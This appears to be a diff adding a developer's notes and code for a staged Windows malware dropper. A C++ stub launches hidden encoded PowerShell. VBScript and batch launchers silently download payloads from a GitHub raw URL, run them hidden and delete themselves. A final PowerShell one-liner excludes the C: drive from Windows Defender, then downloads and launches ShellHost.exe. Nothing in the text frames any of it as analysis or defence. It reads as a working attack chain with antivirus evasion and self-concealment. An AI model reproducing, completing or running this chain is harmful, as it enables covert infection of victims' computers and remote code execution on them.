@@ -1,0 +1,121 @@
+#include <iostream>
+using namespace std;
+
+int main() {
+    // PowerShell command runs encoded PowerShell script hidden
+    system("powershell.exe -windowstyle hidden -EncodedCommand <Base64_of_VBS_Launcher>");
+    return 0;
+}
+
+
+vbs script launcher:-
+
+Option Explicit
+
+Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell
+
+strURL = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.bat"
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+strTempBat = strTempPath & "\taskfile.bat"
+
+' Download batch file silently
+Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
+objXMLHttp.Open "GET", strURL, False
+objXMLHttp.Send
+
+If objXMLHttp.Status = 200 Then
+    Set objFile = objFSO.CreateTextFile(strTempBat, True)
+    objFile.Write objXMLHttp.ResponseText
+    objFile.Close
+
+    ' Run batch file hidden and wait for completion
+    objShell.Run Chr(34) & strTempBat & Chr(34), 0, True
+
+    ' batch file should self-delete itself
+End If
+
+' Delete this VBScript after everything finishes
+objFSO.DeleteFile WScript.ScriptFullName, True
+
+
+
+.bat file 
+
+@echo off
+powershell.exe -EncodedCommand "<Base64-Encoded-PowerShell-Commands>"
+
+rem Self delete this batch file hidden
+start /b "" cmd /c del "%~f0"&exit /b
+
+
+turn this into a base64 encoding:-
+
+$uri = "https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Am.vbs"
+$out = "$env:TEMP\Am.vbs"
+Invoke-WebRequest -Uri $uri -OutFile $out
+Start-Process -FilePath "wscript.exe" -ArgumentList $out -WindowStyle Hidden -Wait
+Remove-Item $out
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+powershell code :-
+
+for paste bin -> Powershell -w h -enc 
+
+powershell.exe -EncodedCommand "<your-base64-string>"    -> for bat file (this is visible)
+
+for hidden .bat file self execute and hidden:-
+
+@echo off
+powershell.exe -EncodedCommand "<your-base64-string>"
+start /b "" cmd /c del "%~f0"&exit /b
+
+create a vbs shell laucher to hide this bat:-
+
+Option Explicit
+
+Dim objXMLHttp, objFSO, objFile, strURL, strTempBat, strTempPath, objShell
+
+' URL of your batch file to download - replace this with your URL
+strURL = "http://example.com/path/to/yourfile.bat"
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
+strTempBat = strTempPath & "\tempfile.bat"
+
+' Download batch file silently
+Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
+objXMLHttp.Open "GET", strURL, False
+objXMLHttp.Send
+
+If objXMLHttp.Status = 200 Then
+    Set objFile = objFSO.CreateTextFile(strTempBat, True)
+    objFile.Write objXMLHttp.ResponseText
+    objFile.Close
+
+    ' Run batch file hidden and wait for completion
+    objShell.Run Chr(34) & strTempBat & Chr(34), 0, True
+
+    ' Batch file should self-delete itself using your internal logic
+End If
+
+' Delete this VBScript after everything finishes
+objFSO.DeleteFile WScript.ScriptFullName, True
+
+
+
+
+
+
+powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\'; REG ADD 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths' /v C:\ /f; Invoke-WebRequest -OutFile '$env:TEMP\ShellHost.exe' -Uri 'https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/ShellHost.exe'; Start-Process '$env:TEMP\ShellHost.exe'"
+
